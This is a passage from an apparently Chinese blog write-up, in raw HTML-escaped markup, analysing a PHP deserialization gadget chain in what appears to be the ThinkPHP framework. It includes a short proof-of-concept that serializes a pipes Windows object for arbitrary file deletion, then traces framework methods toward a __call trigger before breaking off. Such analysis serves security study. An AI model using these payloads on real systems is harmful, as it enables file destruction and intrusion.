&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 150; 
			flex-basis: 360px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-5/image-20220222151808921.png&#34; data-size=&#34;416x277&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-5/image-20220222151808921.png&#34;
			width=&#34;416&#34;
			height=&#34;277&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-5/image-20220222151808921_hu435cd865cedf380a600b467c82f647e1_22267_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-5/image-20220222151808921_hu435cd865cedf380a600b467c82f647e1_22267_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;发现$this-&amp;gt;files变量，而该removeFiles函数的功能就是删除文件，因此只要有反序列化点，就可实现任意文件删除，POC如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;think\process\pipes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;abstract&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Pipes&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Windows&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Pipes&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$files&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;test.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;base64_encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()));&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;removeFiles()&lt;/code&gt;中使用了&lt;code&gt;file_exists&lt;/code&gt;对&lt;code&gt;$filename&lt;/code&gt;进行处理。&lt;code&gt;file_exists&lt;/code&gt;函数种&lt;code&gt;$filename&lt;/code&gt;会被作为字符串处理，那么如果filename是某个类对象，就会触发&lt;code&gt;__toString&lt;/code&gt;方法。&lt;/li&gt;
&lt;li&gt;全局搜索&lt;code&gt;__toString&lt;/code&gt;，发现Conversion类种存在如下:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 294; 
			flex-basis: 706px&#34;
	&gt;
	&lt;a href=&#34;https://coollllllll.github.io/p/php-5/image-20220222152706447.png&#34; data-size=&#34;592x201&#34;&gt;
		&lt;img src=&#34;https://coollllllll.github.io/p/php-5/image-20220222152706447.png&#34;
			width=&#34;592&#34;
			height=&#34;201&#34;
			srcset=&#34;https://coollllllll.github.io/p/php-5/image-20220222152706447_hu7d005f1d5300363cd400fb530025e1ce_21175_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/php-5/image-20220222152706447_hu7d005f1d5300363cd400fb530025e1ce_21175_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跟进&lt;code&gt;toJson()&lt;/code&gt;：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/**
     * 转换当前模型对象为JSON字符串
     * @access public
     * @param  integer $options json参数
     * @return string
     */
    public function toJson($options = JSON_UNESCAPED_UNICODE)
    {
        return json_encode($this-&amp;gt;toArray(), $options);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;跟进&lt;code&gt;toArray()&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * 转换当前模型对象为数组
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @access public
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @return array
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;toArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;o&#34;&gt;....&lt;/span&gt;
        &lt;span class=&#34;c1&#34;&gt;// 追加属性（必须定义获取器）
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                    &lt;span class=&#34;c1&#34;&gt;// 追加关联对象属性
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                    &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRelation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

                    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                        &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
                        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                            &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;visible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
                        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
                    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

                    &lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;strpos&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                    &lt;span class=&#34;k&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;explode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
                    &lt;span class=&#34;c1&#34;&gt;// 追加关联对象属性
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;                    &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getRelation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

                    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                        &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
                        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                            &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;visible&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
                        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
                    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

                    &lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$relation&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;append&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$attr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;toArray&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[];&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                    &lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
                &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意到了&lt;code&gt;$relation-&amp;gt;visible($name)&lt;/code&gt;，调用&lt;code&gt;$relation&lt;/code&gt;变量的visible方法，参数为&lt;code&gt;$name&lt;/code&gt;，而name是从&lt;code&gt;$this-&amp;gt;append&lt;/code&gt;取出来的，而&lt;code&gt;$this-&amp;gt;append&lt;/code&gt;我们可以通过自定义属性进行控制，那么name就可控，当&lt;code&gt;$relation&lt;/code&gt;也可控的话，令其为某个类对象，当调用visible方法不存在时，则会触发该类对象的&lt;code&gt;__call&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;接下来就是寻找如何控制&lt;code&gt;$relation&lt;/code&gt;。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跟进&lt;code&gt;$this-&amp;gt;getRelation&lt;/code&gt;:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * 获取当前模型的关联模型数据
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @access public
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  string $name 关联方法名
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @return mixed
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getRelation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;elseif&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;array_key_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;relation&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现可以直接return，而且后续判断语句为&lt;code&gt;if (!$relation)&lt;/code&gt;，所以可继续跟进。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跟进&lt;code&gt;$this-&amp;gt;getAttr&lt;/code&gt;，进入&lt;code&gt;Attribute&lt;/code&gt;类:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * 获取器 获取数据对象的值
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @access public
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  string $name 名称
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  array  $item 数据
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @return mixed
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @throws InvalidArgumentException
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getAttr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$item&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$notFound&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;InvalidArgumentException&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$notFound&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
            &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;    &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

      &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;

        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$value&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;返回值由&lt;code&gt;$this-&amp;gt;getData&lt;/code&gt;确定，跟进该方法：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;sd&#34;&gt;/**
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * 获取对象原始数据 如果不存在指定字段返回false
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @access public
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @param  string $name 字段名 留空获取全部
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @return mixed
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     * @throws InvalidArgumentException
&lt;/span&gt;&lt;span class=&#34;sd&#34;&gt;     */&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getData&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;is_null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
